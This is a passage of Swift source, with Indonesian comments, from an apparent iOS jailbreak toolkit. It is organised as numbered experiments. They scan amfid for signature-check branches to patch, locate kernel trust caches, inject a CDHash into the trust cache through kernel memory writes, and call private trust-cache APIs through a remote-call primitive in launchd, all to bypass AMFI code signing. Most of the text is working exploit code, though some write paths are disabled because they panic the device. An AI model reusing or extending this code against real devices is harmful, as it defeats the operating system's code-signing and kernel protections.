        let fileSize = RootExecutor.rcall(rc, "lseek", srcFd, 0, 2) // SEEK_END=2
        RootExecutor.rcall(rc, "lseek", srcFd, 0, 0) // SEEK_SET=0, rewind
        detail += "amfid size: \(fileSize) bytes (\(fileSize / 1024) KB)\n"

        guard fileSize > 0 && fileSize < 2_000_000 else {
            detail += "❌ File size tidak masuk akal.\n"
            RootExecutor.rcall(rc, "close", srcFd)
            RootExecutor.rcall(rc, "free", srcPath)
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // ── Step 2: Read Mach-O header ───────────────────────────────
        detail += "\n=== Step 2: Read Mach-O header ===\n"
        let hdrBuf = mem + 0x800
        RootExecutor.rcall(rc, "read", srcFd, hdrBuf, 4096)
        RootExecutor.rcall(rc, "lseek", srcFd, 0, 0) // rewind

        let magic = rc[hdrBuf].value32()
        detail += "magic: 0x\(String(format: "%08x", magic))\n"

        guard magic == 0xFEEDFACF else {
            detail += "❌ Bukan Mach-O 64-bit (expected 0xFEEDFACF)\n"
            RootExecutor.rcall(rc, "close", srcFd)
            RootExecutor.rcall(rc, "free", srcPath)
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        let cputype = rc[hdrBuf + 4].value32()
        let ncmds = rc[hdrBuf + 16].value32()
        detail += "cputype: 0x\(String(format: "%x", cputype)) (\(cputype == 0x0100000C ? "arm64e" : "arm64"))\n"
        detail += "ncmds: \(ncmds)\n"

        // Parse load commands to find __TEXT segment
        var textFileOff: UInt64 = 0
        var textFileSize: UInt64 = 0
        var textVMAddr: UInt64 = 0
        var cmdOffset: UInt64 = 32 // sizeof(mach_header_64)

        for _ in 0..<min(ncmds, 32) {
            let cmd = rc[hdrBuf + cmdOffset].value32()
            let cmdsize = rc[hdrBuf + cmdOffset + 4].value32()

            if cmd == 0x19 { // LC_SEGMENT_64
                // Read segment name (16 bytes at +8)
                var segName = ""
                for i: UInt64 in 0..<16 {
                    let ch = rc[hdrBuf + cmdOffset + 8 + i].value8()
                    if ch == 0 { break }
                    segName += String(UnicodeScalar(ch))
                }

                if segName == "__TEXT" {
                    textVMAddr = rc[hdrBuf + cmdOffset + 24].value64()
                    let vmsize = rc[hdrBuf + cmdOffset + 32].value64()
                    textFileOff = rc[hdrBuf + cmdOffset + 40].value64()
                    textFileSize = rc[hdrBuf + cmdOffset + 48].value64()
                    detail += "__TEXT: vm=0x\(String(format: "%llx", textVMAddr)), size=0x\(String(format: "%llx", vmsize))\n"
                    detail += "  fileoff=0x\(String(format: "%llx", textFileOff)), filesize=0x\(String(format: "%llx", textFileSize))\n"
                }
            }
            cmdOffset += UInt64(cmdsize)
            if cmdOffset >= 4096 { break }
        }

        guard textFileSize > 0 else {
            detail += "❌ __TEXT segment tidak ditemukan.\n"
            RootExecutor.rcall(rc, "close", srcFd)
            RootExecutor.rcall(rc, "free", srcPath)
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // ── Step 3: Scan __TEXT untuk patch targets ───────────────────
        detail += "\n=== Step 3: Scan ARM64 instruksi ===\n"
        detail += "Mencari pola BL + CBNZ W0 (signature check + error branch)...\n\n"

        // Read __TEXT in chunks and scan for patterns
        // BL = 0x94xxxxxx (bits[31:26] = 100101)
        // CBNZ W0 = 0x35xxxxxx with Rt=0 (bits[31:24]=0x35, bits[4:0]=0)
        // CBZ W0 = 0x34xxxxxx with Rt=0
        // B.NE = 0x54xxxxxx with cond=0001

        var patchTargets: [(offset: UInt64, vmaddr: UInt64, instr: UInt32, nextInstr: UInt32, ptype: String)] = []
        let chunkSize: UInt64 = 4096
        let scanBuf = mem + 0x2000

        // Seek to __TEXT start
        RootExecutor.rcall(rc, "lseek", srcFd, textFileOff, 0)

        var scannedBytes: UInt64 = 0
        let maxScan = min(textFileSize, 512 * 1024) // max 512KB scan

        while scannedBytes < maxScan {
            let toRead = min(chunkSize, maxScan - scannedBytes)
            let nRead = RootExecutor.rcall(rc, "read", srcFd, scanBuf, toRead)
            if nRead == 0 || nRead > chunkSize { break }

            // Scan instructions in this chunk (4 bytes each)
            let instrCount = Int(nRead / 4)
            for i in 0..<(instrCount - 1) {
                let instrOff = UInt64(i * 4)
                let instr = rc[scanBuf + instrOff].value32()
                let nextInstr = rc[scanBuf + instrOff + 4].value32()

                let fileOffset = textFileOff + scannedBytes + instrOff
                let vmaddr = textVMAddr + scannedBytes + instrOff

                // Check: is this BL?
                let isBL = (instr >> 26) == 0x25

                if isBL {
                    // Check next instruction
                    let isCBNZ_W0 = (nextInstr >> 24) == 0x35 && (nextInstr & 0x1F) == 0
                    let isCBZ_W0 = (nextInstr >> 24) == 0x34 && (nextInstr & 0x1F) == 0
                    let isBNE = (nextInstr & 0xFF00001F) == 0x54000001

                    if isCBNZ_W0 {
                        patchTargets.append((fileOffset + 4, vmaddr + 4, instr, nextInstr, "BL+CBNZ_W0"))
                    } else if isCBZ_W0 {
                        patchTargets.append((fileOffset, vmaddr, instr, nextInstr, "BL+CBZ_W0"))
                    } else if isBNE {
                        patchTargets.append((fileOffset + 4, vmaddr + 4, instr, nextInstr, "BL+B.NE"))
                    }
                }

                // Also standalone CBNZ W0 (common pattern)
                let isCBNZ_W0_standalone = (instr >> 24) == 0x35 && (instr & 0x1F) == 0
                if isCBNZ_W0_standalone && !isBL {
                    // Check if previous instruction was BL (already caught above)
                    // Only add if this is a standalone CBNZ not preceded by BL
                    if i > 0 {
                        let prevInstr = rc[scanBuf + instrOff - 4].value32()
                        let prevIsBL = (prevInstr >> 26) == 0x25
                        if !prevIsBL {
                            patchTargets.append((fileOffset, vmaddr, instr, 0, "CBNZ_W0"))
                        }
                    }
                }

                if patchTargets.count >= 50 { break }
            }

            scannedBytes += nRead
            if patchTargets.count >= 50 { break }
        }

        RootExecutor.rcall(rc, "close", srcFd)
        RootExecutor.rcall(rc, "free", srcPath)

        detail += "Scanned \(scannedBytes / 1024) KB of __TEXT\n"
        detail += "Found \(patchTargets.count) patch candidates\n\n"

        if patchTargets.isEmpty {
            detail += "❌ Tidak ada patch candidate ditemukan.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // ── Step 4: Output patch targets ─────────────────────────────
        detail += "=== Step 4: Patch candidates ===\n"
        detail += "(NOP = 0xD503201F, MOV W0,#0 = 0x52800000)\n\n"

        // Prioritize BL+CBNZ_W0 (most likely signature check pattern)
        let blCbnz = patchTargets.filter { $0.ptype == "BL+CBNZ_W0" }
        let blBne = patchTargets.filter { $0.ptype == "BL+B.NE" }
        let others = patchTargets.filter { $0.ptype != "BL+CBNZ_W0" && $0.ptype != "BL+B.NE" }

        detail += "HIGH PRIORITY (BL + CBNZ W0): \(blCbnz.count)\n"
        for (i, t) in blCbnz.prefix(10).enumerated() {
            let blTarget = decodeBlTarget(t.instr, pc: t.vmaddr - 4)
            detail += "  [\(i)] file+0x\(String(format: "%llx", t.offset)) vm=0x\(String(format: "%llx", t.vmaddr))"
            detail += " BL→0x\(String(format: "%llx", blTarget))\n"
        }

        detail += "\nMEDIUM (BL + B.NE): \(blBne.count)\n"
        for (i, t) in blBne.prefix(5).enumerated() {
            detail += "  [\(i)] file+0x\(String(format: "%llx", t.offset)) vm=0x\(String(format: "%llx", t.vmaddr))\n"
        }

        detail += "\nOTHER (standalone CBNZ W0): \(others.count)\n"
        for (i, t) in others.prefix(5).enumerated() {
            detail += "  [\(i)] file+0x\(String(format: "%llx", t.offset)) vm=0x\(String(format: "%llx", t.vmaddr))\n"
        }

        // ── Step 5: Generate hardcoded offsets ────────────────────────
        detail += "\n=== Step 5: Offsets untuk Exp 84 v2 ===\n"
        detail += "amfid __TEXT base on device: 0x\(String(format: "%llx", textVMAddr))\n"
        detail += "amfid runtime base (dari Exp 84): 0x16cd60000\n\n"

        // Offset dari __TEXT start (untuk runtime patch)
        detail += "Patch offsets (dari __TEXT start):\n"
        let topTargets = (blCbnz + blBne).prefix(15)
        for (i, t) in topTargets.enumerated() {
            let offFromText = t.vmaddr - textVMAddr
            detail += "  [\(i)] +0x\(String(format: "%llx", offFromText)) (\(t.ptype)) instr=0x\(String(format: "%08x", t.nextInstr != 0 ? t.nextInstr : t.instr))\n"
        }

        detail += "\n=== NEXT STEPS ===\n"
        detail += "Offset di atas akan dipakai Exp 84 v2 untuk patch amfid runtime.\n"
        detail += "Strategi: dari launchd RC, task_for_pid(amfid) → mach_vm_write → NOP\n"
        detail += "Atau: hardcode offset + physmap write (jika page table walk berhasil)\n"

        return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
    }

    /// Decode BL instruction target address
    private func decodeBlTarget(_ instr: UInt32, pc: UInt64) -> UInt64 {
        let imm26 = Int64(instr & 0x3FFFFFF)
        let signExtended = imm26 & 0x2000000 != 0 ? imm26 | Int64(bitPattern: 0xFFFFFFFFFC000000) : imm26
        let offset = signExtended << 2
        return UInt64(Int64(pc) + offset)
    }
    #endif
    
    private func expDeepTCScan() -> ExperimentResult {
        let expName = "Deep TC Scan (Exp 82)"
        var detail = "Experiment 82: Deep Trust Cache Scan\n"
        detail += "=====================================\n\n"
        
        guard PhysmapConstants.isVerified else {
            return ExperimentResult(name: expName, success: false, detail: "Jalankan Physmap Access (Exp 74) dulu.", timestamp: Date())
        }
        
        let kernBase = ds_get_kernel_base()
        let dataOff = ds_kcache_analyze_data_offset() != 0 ? ds_kcache_analyze_data_offset() : PhysmapConstants.dataOffsetFromText
        let dataSegBase = kernBase &+ dataOff
        
        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
        detail += "__DATA base: 0x\(String(format: "%llx", dataSegBase))\n\n"
        detail += "Memulai scan memori __DATA...\n"
        
        // Scan 4MB dari awal __DATA
        let scanSize: UInt64 = 4 * 1024 * 1024 
        var foundTCs = 0
        
        // Helper untuk mengecek apakah sebuah address adalah Trust Cache
        func checkIsTC(_ addr: UInt64) -> Bool {
            let ver = safeKread32Heap(addr)
            let cnt = safeKread32Heap(addr &+ 4)
            if (ver >= 1 && ver <= 3) && (cnt >= 1 && cnt <= 500_000) {
                return true
            }
            return false
        }
        
        for offset in stride(from: UInt64(0), to: scanSize, by: 8) {
            let addr = dataSegBase &+ offset
            let ptr = ds_kreadptr(addr)
            
            // Apakah ptr menunjuk ke heap?
            if ptr != 0 && isSafeKernelHeapKreadAddress(ptr) {
                
                // Cek apakah ptr ini langsung Trust Cache
                if checkIsTC(ptr) {
                    detail += "🎯 [DIRECT] Ditemukan Trust Cache di 0x\(String(format: "%llx", ptr)) (dari __DATA+0x\(String(format: "%x", offset)))\n"
                    let ver = safeKread32Heap(ptr)
                    let cnt = safeKread32Heap(ptr &+ 4)
                    detail += "   -> ver: \(ver), count: \(cnt)\n\n"
                    foundTCs += 1
                } else {
                    // Coba baca ptr sebagai struct/linked list
                    // Baca 4 pointer pertama di dalam struct tsb
                    for i in 0..<4 {
                        let innerPtr = safeKread64Heap(ptr &+ UInt64(i * 8))
                        if innerPtr != 0 && innerPtr != ptr && isSafeKernelHeapKreadAddress(innerPtr) {
                            if checkIsTC(innerPtr) {
                                detail += "🎯 [LINKED] Ditemukan Trust Cache di 0x\(String(format: "%llx", innerPtr))\n"
                                detail += "   (Via __DATA+0x\(String(format: "%x", offset)) -> Heap Struct -> offset +0x\(String(format: "%x", i*8)))\n"
                                let ver = safeKread32Heap(innerPtr)
                                let cnt = safeKread32Heap(innerPtr &+ 4)
                                detail += "   -> ver: \(ver), count: \(cnt)\n\n"
                                foundTCs += 1
                            }
                        }
                    }
                }
            }
        }
        
        detail += "Scan selesai.\n"
        if foundTCs > 0 {
            detail += "Berhasil menemukan \(foundTCs) Trust Cache! Injeksi bisa dilakukan ke alamat tersebut.\n"
        } else {
            detail += "Tidak menemukan Trust Cache. Mount Developer Disk Image terlebih dahulu!\n"
        }
        
        return ExperimentResult(name: expName, success: foundTCs > 0, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 79: KTRR Analysis (Write Test DINONAKTIFKAN — akan panic)

    /// Exp 79: KTRR Analysis — konfirmasi trust cache di KTRR-protected region.
    /// Write test TIDAK dijalankan karena akan menyebabkan panic (KTRR fault).
    /// Dari panic log: "Unexpected fault in kernel static region" saat write ke __DATA.
    /// Jalur yang tersisa: launchd RemoteCall ke trust_cache_runtime_add (Exp 80).
    private func expWriteTest() -> ExperimentResult {
        let expName = "KTRR Analysis (Exp 79)"
        var detail = "Experiment 79: KTRR Region Analysis\n"
        detail += "=====================================\n\n"

        guard PhysmapConstants.isProbeOK else {
            detail += "Jalankan Exp 77 Probe dulu.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        let tcAddr = probedTCAddr
        let tcCount = probedTCCount

        guard tcAddr != 0 else {
            detail += "tc_addr = 0 — probe ulang Exp 77 dulu.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        detail += "tc_addr:  0x\(String(format: "%llx", tcAddr))\n"
        detail += "count:    \(tcCount)\n\n"

        detail += "=== Analisis KTRR dari Panic Log ===\n\n"
        detail += "Panic: 'Unexpected fault in kernel static region'\n"
        detail += "  x3  = 0xdeadbeefcafebabe  (sentinel write test)\n"
        detail += "  x20 = 0xfffffff0296a99b4  (alamat target write)\n"
        detail += "  x22 = 0xfffffff0296a80e8  (tcStructAddr dari probe)\n\n"

        detail += "KESIMPULAN:\n"
        detail += "Trust cache struct ada di __DATA yang di-protect KTRR.\n"
        detail += "KTRR (Kernel Text Readonly Region) di A12 memblokir\n"
        detail += "semua write ke __DATA setelah boot — termasuk via KRW.\n\n"

        detail += "KTRR vs PPL:\n"
        detail += "  PPL = proteksi page table (bypass via physmap)\n"
        detail += "  KTRR = hardware readonly enforcement (tidak bisa bypass)\n\n"

        detail += "JALUR SELANJUTNYA:\n"
        detail += "  Exp 80: launchd RemoteCall ke trust_cache_runtime_add\n"
        detail += "  Kernel API ini PPL-safe: PPL yang melakukan write,\n"
        detail += "  bukan kita langsung. Tidak ada KTRR fault.\n\n"

        detail += "JANGAN jalankan Write Test — akan panic device.\n"
        detail += "Lanjut ke Exp 80: RC Trust Cache Add.\n"

        return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
    }

    /// Exp 79 Tahap 2: Inject CDHash binary target ke trust cache.
    /// Hanya jalankan setelah write test sukses.
    private func expInjectCDHash() -> ExperimentResult {
        let expName = "CDHash Inject (Exp 79)"
        var detail = "Experiment 79: CDHash Inject\n"
        detail += "============================\n\n"

        let tcAddr = probedTCAddr
        let tcCount = probedTCCount
        let tcStride = UInt64(probedTCStride)

        guard tcAddr != 0 else {
            detail += "❌ tc_addr = 0 — probe ulang Exp 77 dulu.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        detail += "tc_addr:  0x\(String(format: "%llx", tcAddr))\n"
        detail += "count:    \(tcCount)\n"
        detail += "stride:   \(tcStride) bytes\n\n"

        // CDHash target: /usr/bin/id (untuk test — ganti dengan binary unsigned kamu)
        // Untuk sekarang pakai dummy CDHash — user harus ganti dengan CDHash binary target
        // CDHash bisa didapat dari: codesign -d --verbose=4 /path/to/binary
        let dummyCDHash: [UInt8] = [
            0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
            0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37,
            0xDE, 0xAD, 0xC0, 0xDE
        ]

        detail += "⚠️ PERHATIAN: CDHash di bawah adalah DUMMY untuk test.\n"
        detail += "Ganti dengan CDHash binary unsigned yang ingin dijalankan.\n"
        detail += "CDHash: \(dummyCDHash.map { String(format: "%02x", $0) }.joined())\n\n"

        // Slot inject
        let slotAddr = tcAddr &+ 8 &+ UInt64(tcCount) * tcStride
        detail += "inject slot: 0x\(String(format: "%llx", slotAddr))\n\n"

        // Validasi
        let kernBase = ds_get_kernel_base()
        let dataOff = ds_kcache_analyze_data_offset() != 0 ? ds_kcache_analyze_data_offset() : PhysmapConstants.dataOffsetFromText
        let dataSegBase = kernBase &+ dataOff
        let pplDataBase = dataSegBase &+ PhysmapConstants.pplDataOffsetFromData

        guard isSafeTrustCacheStructVA(slotAddr &+ 16, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase) else {
            detail += "❌ slot addr tidak aman.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Tulis CDHash entry (stride=24):
        // [0..7]   cdhash bytes 0-7
        // [8..15]  cdhash bytes 8-15
        // [16..19] cdhash bytes 16-19
        // [20]     hash_type = 2 (SHA256)
        // [21]     flags = 0
        // [22..23] padding

        var w0: UInt64 = 0
        w0 |= UInt64(dummyCDHash[0])
        w0 |= UInt64(dummyCDHash[1]) << 8
        w0 |= UInt64(dummyCDHash[2]) << 16
        w0 |= UInt64(dummyCDHash[3]) << 24
        w0 |= UInt64(dummyCDHash[4]) << 32
        w0 |= UInt64(dummyCDHash[5]) << 40
        w0 |= UInt64(dummyCDHash[6]) << 48
        w0 |= UInt64(dummyCDHash[7]) << 56

        var w1: UInt64 = 0
        w1 |= UInt64(dummyCDHash[8])
        w1 |= UInt64(dummyCDHash[9]) << 8
        w1 |= UInt64(dummyCDHash[10]) << 16
        w1 |= UInt64(dummyCDHash[11]) << 24
        w1 |= UInt64(dummyCDHash[12]) << 32
        w1 |= UInt64(dummyCDHash[13]) << 40
        w1 |= UInt64(dummyCDHash[14]) << 48
        w1 |= UInt64(dummyCDHash[15]) << 56

        var w2: UInt64 = 0
        w2 |= UInt64(dummyCDHash[16])
        w2 |= UInt64(dummyCDHash[17]) << 8
        w2 |= UInt64(dummyCDHash[18]) << 16
        w2 |= UInt64(dummyCDHash[19]) << 24
        w2 |= UInt64(2) << 32   // hash_type = SHA256
        w2 |= UInt64(0) << 40   // flags = normal
        // bytes 6-7: padding = 0

        ds_kwrite64(slotAddr &+ 0,  w0)
        ds_kwrite64(slotAddr &+ 8,  w1)
        ds_kwrite64(slotAddr &+ 16, w2)

        // Verify tulis
        let rb0 = ds_kread64(slotAddr &+ 0)
        let rb1 = ds_kread64(slotAddr &+ 8)
        let rb2 = ds_kread64(slotAddr &+ 16)
        detail += "Written:\n"
        detail += "  +0x00: 0x\(String(format: "%016llx", rb0))\n"
        detail += "  +0x08: 0x\(String(format: "%016llx", rb1))\n"
        detail += "  +0x10: 0x\(String(format: "%016llx", rb2))\n\n"

        guard rb0 == w0 && rb1 == w1 else {
            detail += "❌ Verify gagal — write tidak efektif (KTRR?).\n"
            detail += "Jalankan Write Test dulu untuk konfirmasi.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Update count
        let oldCount = ds_kread32(tcAddr &+ 4)
        let newCount = oldCount + 1
        ds_kwrite32(tcAddr &+ 4, newCount)
        let verifyCount = ds_kread32(tcAddr &+ 4)
        detail += "count: \(oldCount) → \(newCount) (verify: \(verifyCount))\n\n"

        if verifyCount != newCount {
            detail += "❌ Count update gagal — kemungkinan KTRR.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Update state
        DispatchQueue.main.async {
            self.probedTCCount = newCount
        }

        detail += "✅ INJECT OK — CDHash masuk ke trust cache!\n"
        detail += "count sekarang: \(newCount)\n\n"
        detail += "Langkah selanjutnya:\n"
        detail += "1. Ganti dummyCDHash dengan CDHash binary unsigned target\n"
        detail += "2. Jalankan ④ Test Binary Spawn dengan path binary tersebut\n"
        detail += "3. Jika spawn berhasil tanpa SIGKILL → AMFI BYPASS CONFIRMED!\n"
        return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 80: RC Trust Cache Add via dlopen userspace libs

    /// Exp 80 (Opsi D — amfid/trustd userspace libs via dlopen):
    ///
    /// Pelajaran dari panic sebelumnya:
    ///   - Opsi C (rcallAddr kernel VA) → CRASH karena kernel VA tidak ada di launchd address space
    ///   - dlsym(RTLD_DEFAULT) → tidak resolve karena fungsi tidak di-export ke dyld shared cache
    ///
    /// Opsi D: dlopen framework/dylib yang punya trust cache API, lalu dlsym dari handle itu.
    /// Target libraries:
    ///   1. /usr/lib/libmis.dylib — Mobile Installation Service, punya trust cache API
    ///   2. /System/Library/PrivateFrameworks/MobileInstallation.framework/MobileInstallation
    ///   3. /usr/lib/libTrustEvaluationAgent.dylib
    ///   4. /System/Library/PrivateFrameworks/Security.framework/Security
    ///
    /// Fungsi yang dicari setelah dlopen:
    ///   - MISValidateSignatureAndCopyInfo (libmis) — bisa trigger trust cache add
    ///   - SecTrustEvaluate variants
    ///   - _MISCopyEntitlementsForURL
    #if !DISABLE_REMOTECALL
    private func expRCTrustCacheAdd(rc: RemoteCall) -> ExperimentResult {
        let expName = "RC Trust Cache Add (Exp 80 — dlopen)"
        var detail = "Experiment 80: RC Trust Cache Add (Opsi D — dlopen userspace)\n"
        detail += "=============================================================\n\n"

        let kernBase = ds_get_kernel_base()
        let mem = rc.trojanMem

        detail += "kernel_base: 0x\(String(format: "%llx", kernBase))\n\n"

        // ===================================================================
        // Step 1: dlopen candidate libraries dan cari trust cache API
        // ===================================================================
        detail += "=== Step 1: dlopen candidate libraries ===\n"

        // Library candidates yang mungkin punya trust cache API
        let libCandidates: [(path: String, symbols: [String])] = [
            (
                "/usr/lib/libmis.dylib",
                ["_MISValidateSignatureAndCopyInfo",
                 "_MISCopyEntitlementsForURL",
                 "_MISTrustCacheAdd",
                 "_MISInstallTrustCache",
                 "_MISValidateSignature"]
            ),
            (
                "/System/Library/PrivateFrameworks/MobileInstallation.framework/MobileInstallation",
                ["_MIInstallTrustCache",
                 "_MITrustCacheAdd",
                 "_MobileInstallationInstall"]
            ),
            (
                "/usr/lib/libTrustEvaluationAgent.dylib",
                ["_TEAAddTrustCache",
                 "_TEATrustCacheAdd"]
            ),
            (
                "/System/Library/Frameworks/Security.framework/Security",
                ["_SecTrustEvaluate",
                 "_SecTrustEvaluateWithError",
                 "_SecCodeCopySigningInformation"]
            ),
            (
                "/usr/lib/libcoretls.dylib",
                ["_tls_add_trust_anchor"]
            ),
        ]

        var foundLib = ""
        var foundSym = ""
        var foundFn: UInt64 = 0
        let RTLD_NOW: UInt64 = 2
        let RTLD_GLOBAL: UInt64 = 8

        for lib in libCandidates {
            let libPathAddr = remote_alloc_str(rc, lib.path)
            let handle = RootExecutor.rcall(rc, "dlopen", libPathAddr, RTLD_NOW | RTLD_GLOBAL)
            RootExecutor.rcall(rc, "free", libPathAddr)

            if handle == 0 {
                detail += "  \(lib.path): dlopen failed\n"
                continue
            }
            detail += "  \(lib.path): handle=0x\(String(format: "%llx", handle)) ✅\n"

            for sym in lib.symbols {
                let symAddr = remote_alloc_str(rc, sym)
                let fn = RootExecutor.rcall(rc, "dlsym", handle, symAddr)
                RootExecutor.rcall(rc, "free", symAddr)
                if fn != 0 {
                    detail += "    \(sym): 0x\(String(format: "%llx", fn)) ✅\n"
                    if foundFn == 0 {
                        foundLib = lib.path
                        foundSym = sym
                        foundFn = fn
                    }
                } else {
                    detail += "    \(sym): not found\n"
                }
            }
            // Jangan close handle — biarkan loaded
        }

        // ===================================================================
        // Step 2: Jika tidak ada dari dlopen, coba RTLD_DEFAULT dengan nama
        //         yang lebih lengkap (kadang ada di shared cache tapi nama beda)
        // ===================================================================
        if foundFn == 0 {
            detail += "\nTidak ada dari dlopen — coba RTLD_DEFAULT extended scan...\n"
            let RTLD_DEFAULT = UInt64(bitPattern: -2)
            let extendedSyms = [
                "_MISValidateSignatureAndCopyInfo",
                "_MISCopyEntitlementsForURL",
                "MISValidateSignatureAndCopyInfo",
                "_SecTrustEvaluate",
                "_SecCodeCopySigningInformation",
                "_amfi_check_dyld_policy_self",
                "_amfi_check_trust_cache_for_hash",
            ]
            for sym in extendedSyms {
                let symAddr = remote_alloc_str(rc, sym)
                let fn = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, symAddr)
                RootExecutor.rcall(rc, "free", symAddr)
                if fn != 0 {
                    detail += "  RTLD_DEFAULT \(sym): 0x\(String(format: "%llx", fn)) ✅\n"
                    if foundFn == 0 {
                        foundLib = "RTLD_DEFAULT"
                        foundSym = sym
                        foundFn = fn
                    }
                }
            }
        }

        guard foundFn != 0 else {
            detail += "\n❌ Tidak ada trust cache API ditemukan via dlopen/dlsym.\n"
            detail += "Semua library tidak punya simbol yang dibutuhkan.\n\n"
            detail += "=== Diagnosis ===\n"
            detail += "Ini konfirmasi bahwa trust cache API tidak accessible dari userspace.\n"
            detail += "Satu-satunya jalur yang tersisa:\n"
            detail += "  → Modifikasi CS flags di proc_ro via physmap (bypass KTRR)\n"
            detail += "  → Atau: patch amfid memory untuk skip signature check\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        detail += "\n✅ Found: \(foundSym) dari \(foundLib)\n"
        detail += "   addr: 0x\(String(format: "%llx", foundFn))\n\n"

        // ===================================================================
        // Step 3: Build trust cache struct dan panggil API
        // ===================================================================
        detail += "=== Step 3: Build struct & call API ===\n"

        let testCDHash: [UInt8] = [
            0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
            0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37,
            0xDE, 0xAD, 0xC0, 0xDE
        ]

        let structBase = mem + 0x1000
        rc[structBase + 0].setValue32(1)   // version
        rc[structBase + 4].setValue32(1)   // num_entries
        rc[structBase + 8].setValue64(0)   // uuid[0..7]
        rc[structBase + 16].setValue64(0)  // uuid[8..15]

        let entryBase = structBase + 0x18
        func packBytes(_ bytes: [UInt8], from: Int, count: Int) -> UInt64 {
            var v: UInt64 = 0
            for i in 0..<min(count, bytes.count - from) {
                v |= UInt64(bytes[from + i]) << (i * 8)
            }
            return v
        }
        rc[entryBase + 0].setValue64(packBytes(testCDHash, from: 0, count: 8))
        rc[entryBase + 8].setValue64(packBytes(testCDHash, from: 8, count: 8))
        var w2: UInt64 = packBytes(testCDHash, from: 16, count: 4)
        w2 |= UInt64(2) << 32
        rc[entryBase + 16].setValue64(w2)
        let structSize: UInt64 = 0x18 + 24

        detail += "CDHash: \(testCDHash.map { String(format: "%02x", $0) }.joined())\n"
        detail += "Struct: 0x\(String(format: "%llx", structBase)), size=\(structSize)\n\n"

        // Panggil berdasarkan nama fungsi
        var ret: UInt64 = 0xDEAD
        detail += "Calling \(foundSym)...\n"

        if foundSym.contains("MISValidateSignature") {
            // MISValidateSignatureAndCopyInfo(path, options, info_out) → int
            // Kita tidak punya binary path yang valid, tapi coba dengan NULL
            ret = RootExecutor.rcall(rc, foundSym, 0, 0, 0)
        } else if foundSym.contains("TrustCache") || foundSym.contains("trust_cache") {
            // Generic trust cache add: fn(struct, size) atau fn(type, struct, size)
            ret = RootExecutor.rcall(rc, foundSym, structBase, structSize)
        } else if foundSym.contains("SecTrust") {
            // SecTrustEvaluate — read-only, tidak akan inject tapi berguna untuk diagnosa
            ret = RootExecutor.rcall(rc, foundSym, 0, 0)
        } else {
            ret = RootExecutor.rcall(rc, foundSym, structBase, structSize)
        }

        detail += "ret = 0x\(String(format: "%llx", ret)) (\(ret))\n\n"

        if ret == 0 {
            detail += "✅ ret=0 — Kemungkinan sukses!\n"
            detail += "Jalankan ④ Test Binary Spawn untuk verifikasi.\n"
            return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
        } else {
            detail += "ret != 0 — errno=\(remote_errno(rc))\n\n"
            detail += "=== Analisis ===\n"
            detail += "Library ditemukan tapi API tidak berhasil inject trust cache.\n"
            detail += "Kemungkinan: fungsi butuh entitlement khusus atau parameter berbeda.\n\n"
            detail += "=== Jalur Selanjutnya: CS Flags Bypass ===\n"
            detail += "Karena trust cache API tidak accessible, pivot ke:\n"
            detail += "Modifikasi cs_flags di proc_ro untuk binary target:\n"
            detail += "  cs_flags |= CS_VALID | CS_PLATFORM_BINARY\n"
            detail += "  → Binary dianggap platform binary → AMFI skip check\n"
            detail += "Ini membutuhkan write ke proc_ro via physmap.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }
    }
    #endif
    /// 1. Walk page tables (L1→L2→L3) to find trust cache's PHYSICAL address
    /// 2. Compute physmap VA for that physical page (bypasses PPL!)
    /// 3. Write CDHash through physmap VA (PPL only protects original VA mapping)
    /// 4. posix_spawn binary → AMFI approves → FULL JAILBREAK!
    ///
    /// KEY INSIGHT: PPL protects VIRTUAL page permissions. The physmap is a SEPARATE
    /// virtual mapping of the same physical memory with DIFFERENT permissions.
    /// Writing through physmap bypasses PPL's page table protections entirely.
    private func expTrustCacheWrite(rc: RemoteCall?, dryRun: Bool = false) -> ExperimentResult {
        if dryRun {
            return expTrustCacheProbeSafe()
        }

        let expName = "Trust Cache Inject (Exp 77)"
        var detail = "Experiment 77: Inject — DINONAKTIFKAN\n"
        detail += "====================================================\n\n"
        detail += "❌ Physmap / KRW write ke trust cache memicu PPL panic di A12:\n"
        detail += "   \"Unexpected fault in kernel static region\"\n"
        detail += "(sama seperti di panic.txt — jangan ulangi Inject).\n\n"
        detail += "Probe (②) tetap aman (read-only). CDHash butuh API kernel/trustd\n"
        detail += "via RemoteCall — belum diimplementasi di build ini.\n"
        return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())

        let physmap = PhysmapConstants.loadOrDefault()
        let gPhysBase = physmap.gPhysBase
        let gVirtBase = physmap.gVirtBase
        let kernBase = ds_get_kernel_base()
        let kernSlide = ds_get_kernel_slide()

        detail += "Mode: INJECT (physmap write)\n"
        detail += "gVirtBase: 0x\(String(format: "%llx", gVirtBase))\(PhysmapConstants.isVerified ? "" : " (default)")\n"
        detail += "gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n"
        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n\n"
        
